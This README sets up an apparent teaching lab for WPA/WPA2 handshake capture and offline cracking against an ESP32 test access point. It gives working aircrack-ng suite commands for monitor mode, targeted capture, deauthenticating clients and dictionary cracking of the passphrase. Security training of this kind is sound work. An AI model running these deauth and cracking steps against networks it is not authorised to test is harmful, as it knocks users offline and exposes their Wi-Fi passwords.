# Handshake-Cracking-Lab

> ⚠️ **Legal notice:** Use this lab only on networks and hardware you own or have explicit written permission to test.

## Purpose
This repository is a hands-on lab for learning WPA/WPA2 handshake capture and offline password cracking in a controlled environment.

The planned structure is:
- **ESP32 C++ code** to host a lab access point (to be added later)
- **Operator instructions** for deauth, handshake capture, and password cracking

## Current Scope
The ESP32 C++ implementation is intentionally deferred for now. This README focuses on the repeatable lab workflow.

## Lab Topology
- **Target AP:** ESP32-hosted AP (future code in this repo)
- **Client device:** Any device that can connect to the AP
- **Attacker workstation:** Linux machine with monitor-mode wireless adapter

## Prerequisites
- Linux workstation with `aircrack-ng` suite installed
- Wireless adapter that supports monitor mode + packet injection
- A test wordlist (for example, a custom list containing known lab passwords)

## Lab Workflow

### 1) Start the AP (future repo code)
When the ESP32 code is added, start a WPA2 AP with:
- Known SSID (for example: `LabAP`)
- Known passphrase (for example: `LabPass123!`)

### 2) Put adapter into monitor mode
Use `airmon-ng`:

```bash
sudo airmon-ng start wlan0
```

This typically creates a monitor interface such as `wlan0mon`.

### 3) Discover target AP and channel
Scan nearby APs and note the BSSID + channel of your lab AP:

```bash
sudo airodump-ng wlan0mon
```

### 4) Capture handshake traffic
Lock to the lab AP channel and capture packets:

```bash
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
```

### 5) Force client reauthentication (deauth)
Trigger reconnect activity so a handshake is captured:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

If clients are connected, one should reauthenticate and generate a handshake.

### 6) Verify handshake capture
Check capture quality before cracking:

```bash
aircrack-ng capture-01.cap
```

Look for a valid WPA handshake indication.

### 7) Run offline password cracking
Run dictionary attack against the capture:

```bash
aircrack-ng -w <WORDLIST_PATH> -b <BSSID> capture-01.cap
```

If the passphrase exists in the wordlist, `aircrack-ng` should recover it.

## Troubleshooting
- No handshake captured: ensure at least one client is connected, then repeat deauth.
- Injection fails: confirm adapter/chipset supports injection.
- Wrong channel: re-check AP channel and lock capture to that channel.
- Crack fails: use better wordlists/rules or verify AP passphrase.

## Next Steps
- Add ESP32 C++ AP-hosting code under a dedicated source directory
- Add reproducible scripts for lab setup and capture parsing
- Add lab validation notes/screenshots for repeatability
